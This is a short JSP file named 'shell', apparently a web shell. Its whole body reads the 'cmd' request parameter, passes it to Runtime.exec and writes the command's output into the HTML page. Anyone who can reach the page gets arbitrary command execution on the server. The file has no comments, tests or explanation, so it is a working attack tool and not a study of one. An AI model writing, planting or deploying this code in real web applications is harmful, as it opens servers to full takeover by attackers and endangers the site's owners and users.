<%-- 
    Document   : shell
    Created on : Nov 12, 2017, 10:47:22 PM
    Author     : shadyside
--%>

<%@page import="java.io.InputStreamReader"%>
<%@page import="java.io.BufferedReader"%>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>JSP Page</title>
    </head>
    <body>
        <%
            Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = null;
            while ((line = br.readLine()) != null) {
        %>
        <p><%= line%></p>
        <%
            }
        %>
    </body>
</html>
